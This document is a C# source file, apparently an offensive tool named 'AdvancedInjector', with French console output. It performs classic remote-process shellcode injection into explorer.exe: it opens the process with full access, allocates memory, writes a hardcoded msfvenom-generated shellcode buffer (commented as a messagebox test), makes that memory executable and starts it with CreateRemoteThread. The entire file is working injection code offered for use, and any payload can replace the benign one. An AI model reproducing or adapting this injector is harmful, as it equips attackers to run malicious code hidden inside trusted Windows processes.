using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace AdvancedInjector
{
    class BasicShellcodeInjector
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x1F0FFF
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40,
            ReadWrite = 0x04
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect, out uint lpflOldProtect);

        static void Main()
        {
            string targetProc = "explorer";
            Console.WriteLine($"[*] Recherche de `{targetProc}.exe`...");

            Process[] targetProcesses = Process.GetProcessesByName(targetProc);
            if (targetProcesses.Length == 0)
            {
                Console.WriteLine($"[!] Aucun processus `{targetProc}` trouvé !");
                return;
            }

            int targetPid = targetProcesses[0].Id;
            Console.WriteLine($"[+] PID trouvé : {targetPid}");

            // msfvenom -p windows/x64/messagebox TEXT="Test réussi" TITLE="Shellcode" -f csharp
            byte[] shellcode = new byte[308] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
                0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x48,0x8b,0x52,
                0x18,0x48,0x8b,0x52,0x20,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
                0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,
                0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,
                0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,
                0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,
                0x67,0x48,0x01,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,
                0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,
                0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
                0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,
                0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,
                0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,
                0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
                0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,
                0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,
                0x59,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,
                0x00,0x00,0x00,0x00,0xe8,0x0d,0x00,0x00,0x00,0x54,0x65,0x73,
                0x74,0x20,0x72,0xc3,0xa9,0x75,0x73,0x73,0x69,0x00,0x5a,0xe8,
                0x0a,0x00,0x00,0x00,0x53,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,
                0x65,0x00,0x41,0x58,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,
                0x07,0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,
                0xff,0xd5};

            IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, targetPid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[!] Impossible d'ouvrir le processus !");
                return;
            }

            Console.WriteLine("[*] Allocation de mémoire dans le processus cible...");
            IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
            if (allocatedMemory == IntPtr.Zero)
            {
                Console.WriteLine("[!] Échec de l'allocation mémoire !");
                return;
            }

            Console.WriteLine("[*] Injection du shellcode...");
            IntPtr bytesWritten;
            bool writeSuccess = WriteProcessMemory(hProcess, allocatedMemory, shellcode, shellcode.Length, out bytesWritten);
            if (!writeSuccess)
            {
                Console.WriteLine("[!] Échec de l'injection !");
                return;
            }

            Console.WriteLine("[*] Modification des permissions mémoire...");
            uint oldProtect;
            VirtualProtectEx(hProcess, allocatedMemory, (uint)shellcode.Length, MemoryProtection.ExecuteReadWrite, out oldProtect);

            Console.WriteLine("[*] Création du thread distant...");
            IntPtr remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
            if (remoteThread == IntPtr.Zero)
            {
                Console.WriteLine("[!] Échec de la création du thread !");
                return;
            }

            Console.WriteLine($"[+] Shellcode injecté et exécuté dans `{targetProc}.exe` !");
        }
    }
}